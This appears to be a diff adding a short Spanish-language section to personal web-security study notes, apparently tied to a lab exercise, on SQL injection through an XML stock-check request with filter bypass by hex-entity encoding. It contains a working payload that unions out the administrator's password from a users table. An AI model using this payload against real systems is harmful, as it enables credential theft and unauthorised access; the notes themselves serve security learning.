@@ -305,6 +305,24 @@ if __name__ == '__main__':
 
 
 
+#### #### SQL injection with filter bypass via XML encoding #### ####
+Al capturar con Burp Suite el paquete, si vemos que envía información de mas como por ejemplo etiquetas xml, podemos inyectar el código desde ahi para 
+obtener información.
+
+
+<?xml version="1.0" encoding="UTF-8"?>
+<stockCheck>
+    <productId>
+      2
+    </productId>
+  <storeId>
+    <@hex_entities>
+        1 union select password from users where username='administrator'-- -
+    </@hex_entities>
+  </storeId>
+</stockCheck>
+
+
 
 
 https://www.youtube.com/watch?v=C-FiImhUviM
